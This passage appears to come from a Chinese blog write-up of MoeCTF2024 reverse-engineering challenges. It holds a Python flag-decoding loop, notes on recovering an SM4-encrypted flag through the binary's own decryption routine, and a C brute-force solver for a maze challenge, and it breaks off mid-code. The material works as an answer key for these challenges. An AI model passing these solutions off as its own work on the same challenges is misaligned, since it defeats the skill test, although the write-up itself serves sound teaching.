class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((b[i]-<span class="hljs-number">5</span>)^<span class="hljs-number">14</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>((((((c[i]-<span class="hljs-number">5</span>)^<span class="hljs-number">10</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(((((d[i]-<span class="hljs-number">24</span>)-<span class="hljs-number">32</span>)^<span class="hljs-number">202</span>)+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="sm4"><a href="#sm4" class="headerlink" title="sm4"></a>sm4</h2><p>直接在线解密不对，估计还需要iv</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724158570823-42595b04-7841-416b-b72d-103875251e17.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>可能算法有魔改，测试过加密函数和解密函数刚好对称，那就把解密函数的encode_Result改为enc</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724231033107-e06ceffd-7d82-49af-9660-e9ea668816c9.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144757695-5141af2c-9c55-43a9-a4d2-c56ffa3e62d4.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>调试发现解密之后和直接解密结果一样</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144769981-14f1d7ba-a31c-4edb-ac48-8723e5e0bece.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>输入长度为48位的时候正常输出flag</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724228737010-235a7104-10ec-47aa-9b54-9978af1259d8.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>这题不同之处在于直接给了加解密函数，也可以到解密函数把加密后的数据改成密文</p>
<h2 id="ez-MAZE"><a href="#ez-MAZE" class="headerlink" title="ez_MAZE"></a>ez_MAZE</h2><p>类似迷宫题，多了一个校验函数，会把反复的跳动排除</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461159260-6c09856e-a8b9-427e-a292-714d8ba0af37.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>因为逆向题目的路径大多唯一且不需要考虑回溯，直接爆破即可，这里爆破的时候发现爆不到指定长度且不同顺序对于爆破长度有影响，那就回溯几步换一个爆破顺序，这里需要尝试</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461125455-3822aed3-e8dd-435c-8d2a-b45ca00f2ce9.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <br>	<span class="hljs-number">0xC0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x1F</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x96</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x96</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x95</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x95</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xAA</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x92</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x92</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xAE</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x95</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x8A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xAF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xAF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBC</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xA9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x5F</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5F</span>, <br>	<span class="hljs-number">0xB1</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x5F</span>, <br>	<span class="hljs-number">0xAA</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x5F</span>, <br>	<span class="hljs-number">0xBD</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB4</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xB0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0xBC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br>	<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x5F</span>, <br>	<span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sub_7FF78A1D1190</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span><br>	<span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">80</span> || a2 &gt; <span class="hljs-number">56</span> || a1 &lt; <span class="hljs-number">1</span> || a2 &lt; <span class="hljs-number">1</span> )&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;	<br>	&#125;<br>	v3 = a[<span class="hljs-number">10</span> * a2 - <span class="hljs-number">10</span> + (a1 - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>];<br>	a[<span class="hljs-number">10</span> * a2 - <span class="hljs-number">10</span> + (a1 - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>] = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">7</span> - (a1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)) | v3;<br>	<span class="hljs-keyword">return</span> ((<span class="hljs-type">int</span>)v3 &gt;&gt; (<span class="hljs-number">7</span> - (a1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-type">int</span> v4=<span class="hljs-number">2</span>;<br>	<span class="hljs-type">int</span> v5=<span class="hljs-number">2</span>;<br>	<span class="hljs-type">char</span> out[<span class="hljs-number">1200</span>]=&#123;<span class="hljs-string">&#x27;0&#x27;</span>&#125;;<br>	<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> pan=<span class="hljs-number">0</span>;<br>	<span class="hljs-type">char</span> v7[<span class="hljs-number">4</span>]=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>&#125;;<br>	<span class="hljs-keyword">while</span>(k&lt;<span class="hljs-number">1176</span>)&#123;<br>		<span class="hljs-keyword">if</span>(k==<span class="hljs-number">950</span>)&#123;<br>			v7[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br>			v7[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;w&#x27;</span>;<br>			v7[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;d&#x27;</span>;<br>			v7[<span class="hljs-number">3</span>]=<span 